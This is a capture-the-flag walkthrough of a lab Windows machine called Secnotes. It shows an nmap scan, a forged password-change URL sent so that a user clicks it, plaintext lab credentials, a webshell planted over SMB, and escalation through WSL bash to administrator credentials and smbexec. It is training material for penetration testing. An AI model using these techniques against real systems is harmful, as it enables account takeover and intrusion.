# Secnotes

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.180    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 09:49 EDT
Nmap scan report for 10.129.85.180
Host is up (0.010s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast
```

Interesting ports for a Windows machine.

### Request Forgery

Port 80 just shows a login page:

<figure><img src="../../../.gitbook/assets/image (31) (3).png" alt=""><figcaption></figcaption></figure>

We can create a user to login.

<figure><img src="../../../.gitbook/assets/image (21) (7).png" alt=""><figcaption></figcaption></figure>

There's a user with an email, and this user might click on the links we send. I sent one like so:

<figure><img src="../../../.gitbook/assets/image (9) (6) (3).png" alt=""><figcaption></figcaption></figure>

And we do indeed get a callback on a `nc` listening port.

```
$ nc -lvnp 80                          
listening on [any] 80 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.85.180] 49797
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.14.13
Connection: Keep-Alive
```

So there's some request forgery going on here. I tried changing passwords, and viewed the request in Burp:

```http
POST /change_pass.php HTTP/1.1
Host: 10.129.85.180
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://10.129.85.180
Connection: close
Referer: http://10.129.85.180/change_pass.php
Cookie: PHPSESSID=8ufhg7s7ejqtmjcfike2ek21fl
Upgrade-Insecure-Requests: 1



password=test%40123&confirm_password=test%40123&submit=submit
```

I found that if we convert this to a GET requests, it still works. This means we can change the password of the user by redirecting him to the `change.php` site and entering the same parameters. Send this to the Contact Us page:

{% code overflow="wrap" %}
```
http://10.129.85.180/change_pass.php?password=easypass&confirm_password=easypass&submit=submit
```
{% endcode %}

After waiting for a bit, we can login as `tyler` using this password.

<figure><img src="../../../.gitbook/assets/image (50) (5) (2).png" alt=""><figcaption></figcaption></figure>

There are some credentials located within the note **new site**.&#x20;

```
\\secnotes.htb\newsite
tyler / 92g!mA8BGjOirkL%OG*&
```

### SMB

Now that we have some credentials, we can check whether they are valid:

```
$ smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.129.85.182
[+] IP: 10.129.85.182:445       Name: 10.129.85.182                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
```

So we have read and write permissions on `new-site`. There's another IIS web server on port 8808, which I think is the new site being referred to. We can put a webshell on it and check if it works.&#x20;

<figure><img src="../../../.gitbook/assets/image (3) (8) (1).png" alt=""><figcaption></figcaption></figure>

Now we have RCE, and we can get a reverse shell through downloading and executing `nc.exe`.

&#x20;

<figure><img src="../../../.gitbook/assets/image (20) (9).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Bash Shell

Within the user's desktop, there is a `bash.lnk` file:

```
C:\Users\tyler\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Users\tyler\Desktop

08/19/2018  03:51 PM    <DIR>          .
08/19/2018  03:51 PM    <DIR>          ..
06/22/2018  03:09 AM             1,293 bash.lnk
08/02/2021  03:32 AM             1,210 Command Prompt.lnk
04/11/2018  04:34 PM               407 File Explorer.lnk
06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  09:17 AM             1,110 Notepad++.lnk
05/04/2023  07:02 AM                34 user.txt
08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
```

When we view its contents, we can't make out a lot but we can see that `bash.exe` is installed on the system:

{% code overflow="wrap" %}
```
C:\Users\tyler\Desktop>type bash.lnk
type bash.lnk
L�F w������V�   �v(���  ��9P�O� �:i�+00�/C:\V1�LIWindows@       ﾋL���LI.h���&WindowsZ1�L<System32B   ﾋL���L<.p�k�System32▒Z2��LP� bash.exeB  ﾋL<��LU.�Y����bash.exe▒K-JںݜC:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32�%�
                                                                    �wN�▒�]N�D.��Q���`�Xsecnotesx�<sAA��㍧�o�:u��'�/�x�<sAA��㍧�o�:u��'�/�=  �Y1SPS�0��C�G����sf"=dSystem32 (C:\Windows)�1SPS��XF�L8C���&�m�q/S-1-5-21-1791094074-1363918840-4199337083-1002�1SPS0�%��G▒��`����%
        bash.exe@������
                       �)
                         Application@v(���      �i1SPS�jc(=�����O�▒�MC:\Windows\System32\bash.exe91SPS�mD��pH�H@.�=x�hH�(�bP
```
{% endcode %}

We can search for this using `where`.&#x20;

```
C:\Users\tyler\Desktop>where /R c:\ bash.exe
c:\Windows\System32\bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```

The first one doesn't work, so I tried the second one.

<figure><img src="../../../.gitbook/assets/image (25) (7) (1).png" alt=""><figcaption></figcaption></figure>

We would spawn in a `root` shell. We can spawn a PTY shell the normal way with `python3`.

```
exitroot@SECNOTES:~# ls -la
ls -la
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
```

Then, when viewing the bash history file, we can see credentials for the administrator:

```
root@SECNOTES:~# cat .bash_history
<TRUNCATED>
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
```

We can verify these credentials via `smbmap`.&#x20;

<figure><img src="../../../.gitbook/assets/image (37) (6) (1).png" alt=""><figcaption></figcaption></figure>

We have complete control over the file system, and we can get a shell with `smbexec.py` because only SMB is open.

<figure><img src="../../../.gitbook/assets/image (14) (8) (2).png" alt=""><figcaption></figcaption></figure>
